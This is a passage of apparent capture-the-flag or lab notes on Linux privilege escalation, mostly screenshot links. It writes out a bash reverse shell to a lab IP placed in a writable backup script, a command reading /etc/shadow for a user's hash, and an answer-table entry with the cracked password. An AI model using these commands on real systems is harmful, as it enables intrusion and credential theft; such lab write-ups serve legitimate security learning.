...
![[Pasted image 20231215193548.png]]
...
![[Pasted image 20231215194758.png]]

Open and modify `/home/karen/backup.sh`:

![[Pasted image 20231215194035.png]]

Delete the content and add reverse shell (i.e bash):

```
bash -i >& /dev/tcp/10.8.194.147/1234 0>&1
```

![[Pasted image 20231215194435.png]]

Add execute permissions to the file:

![[Pasted image 20231215194631.png]]

And we have root privileges:

![[Pasted image 20231215194839.png]]
...
![[Pasted image 20231215195613.png]]

| Question                 | Answer |
| ------------------------ | ------ |
| What is Matt's password? | 123456 |

Find and extract the hash of the Matt's password:

```
cat /etc/shadow | grep matt
```

![[Pasted image 20231215200052.png]]

Copy the hash to a file and use John:

![[Pasted image 20231215201028.png]]
